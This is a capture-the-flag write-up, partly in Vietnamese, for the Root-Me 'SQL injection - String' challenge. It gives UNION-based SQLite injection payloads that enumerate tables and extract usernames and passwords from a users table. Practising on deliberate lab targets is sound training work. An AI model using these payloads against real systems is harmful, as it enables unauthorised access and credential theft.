# SQL injection - String

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-server%2FSQL%2520Injection%2FSQL%2520injection%2520-%2520String&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

`Link: http://challenge01.root-me.org/web-serveur/ch19/`

## Request:

- Retrieve the administrator password

## Solution:

### Step 1:

- `Vào phần search thử với payload: 'sss'`
  -> Ta thấy xuất hiện lỗi với SQLite

### Step 2: Xem tên các table:

- Gõ từ khoá vào thanh search: ' union select 1,tbl_name from sqlite_master --

-> Ta thu được kết quả tên các table

### Step 3: Trích xuất password:

- Gõ từ khoá vào thanh search: ' union select username,password from users --

-> Key sẽ là password của admin
